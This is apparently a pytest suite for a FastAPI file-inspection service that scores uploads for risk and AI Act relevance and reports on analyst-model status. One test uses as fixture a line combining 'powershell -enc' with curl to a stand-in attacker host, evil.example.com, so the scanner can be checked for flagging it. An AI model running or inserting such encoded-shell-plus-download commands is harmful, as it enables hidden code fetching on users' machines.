from fastapi.testclient import TestClient

import app.api.runtime as runtime_api
from app.main import create_app


def test_runtime_inspection_keeps_plain_docs_quiet() -> None:
    original_model = runtime_api.settings.runtime_analyst_model
    object.__setattr__(runtime_api.settings, "runtime_analyst_model", "")
    try:
        client = TestClient(create_app())
        response = client.post(
            "/runtime/inspect",
            files={
                "file": (
                    "readme.txt",
                    b"Docs mention https://example.com and /tmp/example as harmless examples.",
                    "text/plain",
                )
            },
        )
    finally:
        object.__setattr__(runtime_api.settings, "runtime_analyst_model", original_model)

    assert response.status_code == 200
    payload = response.json()
    assert payload["verdict"] == "quiet"
    assert payload["analysis_mode"] == "heuristic"
    assert payload["ai_act"]["risk_hint"] == "not_assessable"


def test_runtime_inspection_flags_script_with_shell_and_network_as_watch() -> None:
    original_model = runtime_api.settings.runtime_analyst_model
    original_limit = runtime_api.settings.runtime_signal_review_limit
    object.__setattr__(runtime_api.settings, "runtime_analyst_model", "")
    object.__setattr__(runtime_api.settings, "runtime_signal_review_limit", 2)
    try:
        client = TestClient(create_app())
        response = client.post(
            "/runtime/inspect",
            files={
                "file": (
                    "runner.ps1",
                    b"powershell -enc AAAA curl http://evil.example.com",
                    "text/plain",
                )
            },
        )
    finally:
        object.__setattr__(runtime_api.settings, "runtime_analyst_model", original_model)
        object.__setattr__(runtime_api.settings, "runtime_signal_review_limit", original_limit)

    assert response.status_code == 200
    payload = response.json()
    assert payload["verdict"] == "watch"
    assert payload["risk_score"] >= 45
    assert len(payload["signal_reviews"]) <= 2
    assert payload["signal_reviews"][0]["worker"] == "signal-worker-1"
    assert payload["signal_reviews"][0]["review_mode"] == "heuristic"


def test_runtime_ai_act_lens_flags_hiring_ranking_context() -> None:
    original_model = runtime_api.settings.runtime_analyst_model
    object.__setattr__(runtime_api.settings, "runtime_analyst_model", "")
    try:
        client = TestClient(create_app())
        response = client.post(
            "/runtime/inspect",
            files={
                "file": (
                    "hiring_model.md",
                    (
                        b"This AI model ranks CVs and scores candidates for recruitment. "
                        b"Recruiters use recommendations before hiring decisions."
                    ),
                    "text/markdown",
                )
            },
        )
    finally:
        object.__setattr__(runtime_api.settings, "runtime_analyst_model", original_model)

    assert response.status_code == 200
    payload = response.json()
    assert payload["ai_act"]["relevance"] == "likely"
    assert payload["ai_act"]["risk_hint"] == "high_risk_possible"
    assert payload["ai_act"]["triggers"]


def test_runtime_ai_status_reports_off_without_model() -> None:
    original_model = runtime_api.settings.runtime_analyst_model
    object.__setattr__(runtime_api.settings, "runtime_analyst_model", "")
    try:
        client = TestClient(create_app())
        response = client.get("/runtime/ai-status")

        assert response.status_code == 200
        payload = response.json()
        assert payload["enabled"] is False
        assert payload["ready"] is False
    finally:
        object.__setattr__(runtime_api.settings, "runtime_analyst_model", original_model)


def test_runtime_ai_status_reports_ready_with_openai_key() -> None:
    original_model = runtime_api.settings.runtime_analyst_model
    original_key = runtime_api.settings.openai_api_key
    object.__setattr__(runtime_api.settings, "runtime_analyst_model", "openai:gpt-4o-mini")
    object.__setattr__(runtime_api.settings, "openai_api_key", "test-key")
    try:
        client = TestClient(create_app())
        response = client.get("/runtime/ai-status")

        assert response.status_code == 200
        payload = response.json()
        assert payload["enabled"] is True
        assert payload["ready"] is True
        assert payload["provider"] == "openai"
    finally:
        object.__setattr__(runtime_api.settings, "runtime_analyst_model", original_model)
        object.__setattr__(runtime_api.settings, "openai_api_key", original_key)


def test_runtime_ai_status_reports_ready_with_gemini_key() -> None:
    original_model = runtime_api.settings.runtime_analyst_model
    original_key = runtime_api.settings.gemini_api_key
    object.__setattr__(runtime_api.settings, "runtime_analyst_model", "gemini:gemini-2.5-flash")
    try:
        object.__setattr__(runtime_api.settings, "gemini_api_key", "test-key")
        client = TestClient(create_app())
        response = client.get("/runtime/ai-status")

        assert response.status_code == 200
        payload = response.json()
        assert payload["enabled"] is True
        assert payload["ready"] is True
        assert payload["provider"] == "gemini"
    finally:
        object.__setattr__(runtime_api.settings, "runtime_analyst_model", original_model)
        object.__setattr__(runtime_api.settings, "gemini_api_key", original_key)


def test_runtime_ai_status_reports_unsupported_provider() -> None:
    original_model = runtime_api.settings.runtime_analyst_model
    object.__setattr__(runtime_api.settings, "runtime_analyst_model", "bogus:model")
    try:
        client = TestClient(create_app())
        response = client.get("/runtime/ai-status")

        assert response.status_code == 200
        payload = response.json()
        assert payload["enabled"] is True
        assert payload["ready"] is False
        assert payload["provider"] == "bogus"
        assert "unsupported" in payload["message"]
    finally:
        object.__setattr__(runtime_api.settings, "runtime_analyst_model", original_model)
